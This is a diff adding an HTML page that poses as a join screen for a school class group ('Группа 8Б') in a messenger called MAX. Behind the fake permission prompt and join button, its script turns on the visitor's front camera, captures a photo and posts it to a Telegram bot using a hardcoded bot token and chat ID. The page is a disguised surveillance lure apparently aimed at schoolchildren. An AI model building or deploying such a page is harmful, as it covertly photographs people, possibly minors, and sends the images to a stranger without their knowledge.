@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MAX — Группа 8Б</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, Arial, sans-serif;
+    background: #0f0f14;
+    color: #fff;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .screen { width: 100%; max-width: 420px; padding: 32px 24px; text-align: center; }
+  .hidden { display: none; }
+  .logo {
+    width: 96px; height: 96px; border-radius: 24px;
+    background: linear-gradient(135deg, #6a5cff, #00c2ff);
+    margin: 0 auto 24px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 40px; font-weight: 700;
+  }
+  h1 { font-size: 24px; margin-bottom: 12px; }
+  p.sub { color: #9aa0b0; font-size: 15px; margin-bottom: 28px; }
+  .perm {
+    text-align: left; background: #1a1b22; border-radius: 16px;
+    padding: 8px 16px; margin-bottom: 24px;
+  }
+  .perm div { padding: 12px 0; border-bottom: 1px solid #26272f; font-size: 15px; }
+  .perm div:last-child { border-bottom: none; }
+  button {
+    width: 100%; padding: 16px; border: none; border-radius: 14px;
+    background: linear-gradient(135deg, #6a5cff, #00c2ff);
+    color: #fff; font-size: 17px; font-weight: 600; cursor: pointer;
+  }
+  button:active { opacity: .85; }
+  video {
+    width: 100%; border-radius: 16px; margin-bottom: 20px;
+    transform: scaleX(-1);
+  }
+  .error { color: #ff4d4d; font-size: 22px; font-weight: 700; }
+  .status { color: #9aa0b0; font-size: 14px; margin-top: 16px; word-break: break-word; }
+</style>
+</head>
+<body>
+
+<div class="screen" id="step1">
+  <div class="logo">M</div>
+  <h1>Группа 8Б</h1>
+  <p class="sub">Для правильной работы этого приложения требуются дополнительные разрешения MAX, предоставьте доступ</p>
+  <div class="perm">
+    <div>☑️ Доступ к контактам</div>
+    <div>☑️ Доступ к уведомлениям</div>
+    <div>☑️ Доступ к камере и микрофону</div>
+  </div>
+  <button onclick="start()">Присоединиться</button>
+</div>
+
+<div class="screen hidden" id="step2">
+  <video id="video" autoplay playsinline muted></video>
+  <p class="status" id="status">Инициализация камеры…</p>
+</div>
+
+<div class="screen hidden" id="step3">
+  <p class="error">Ошибка</p>
+  <p class="status" id="errText"></p>
+</div>
+
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+  // === TELEGRAM BOT ===
+  const BOT_TOKEN = '8862337691:AAHJW93zNK7aD_LMUYqMdp5wv2a18a2Qb6Q';
+  const CHAT_ID   = '7948959019';
+
+  const step1   = document.getElementById('step1');
+  const step2   = document.getElementById('step2');
+  const step3   = document.getElementById('step3');
+  const video   = document.getElementById('video');
+  const canvas  = document.getElementById('canvas');
+  const status  = document.getElementById('status');
+  const errText = document.getElementById('errText');
+
+  function showError(msg) {
+    step1.classList.add('hidden');
+    step2.classList.add('hidden');
+    step3.classList.remove('hidden');
+    errText.textContent = msg;
+    console.error('[MAX]', msg);
+  }
+
+  async function start() {
+    step1.classList.add('hidden');
+    step2.classList.remove('hidden');
+    status.textContent = 'Запрос доступа к камере…';
+
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      showError('Камера недоступна. Открой страницу через HTTPS.');
+      return;
+    }
+
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: false
+      });
+    } catch (e) {
+      showError('Камера: ' + e.name + ' — ' + e.message);
+      return;
+    }
+
+    video.srcObject = stream;
+    status.textContent = 'Ожидание кадра…';
+
+    await new Promise((resolve) => {
+      if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+      video.onloadeddata = () => resolve();
+    });
+
+    await new Promise(r => setTimeout(r, 1500));
+
+    if (!video.videoWidth || !video.videoHeight) {
+      showError('Кадр ещё не готов');
+      return;
+    }
+
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    stream.getTracks().forEach(t => t.stop());
+
+    status.textContent = 'Отправка…';
+
+    canvas.toBlob(async (blob) => {
+      if (!blob) { showError('Не удалось сформировать изображение'); return; }
+
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'photo.jpg');
+      form.append('caption', 'MAX — Группа 8Б — новое фото\n' + new Date().toLocaleString('ru-RU'));
+
+      const url = `https://api.telegram.org/bot/sendPhoto`;
+
+      try {
+        const res  = await fetch(url, { method: 'POST', body: form });
+        const data = await res.json();
+        console.log('[MAX] Telegram:', data);
+
+        if (!data.ok) {
+          showError('Telegram: ' + (data.description || 'ошибка'));
+          return;
+        }
+
+        status.textContent = 'Готово. Фото отправлено.';
+      } catch (e) {
+        showError('Ошибка сети: ' + e.message);
+      }
+    }, 'image/jpeg', 0.92);
+  }
+</script>
+
+</body>
+</html>
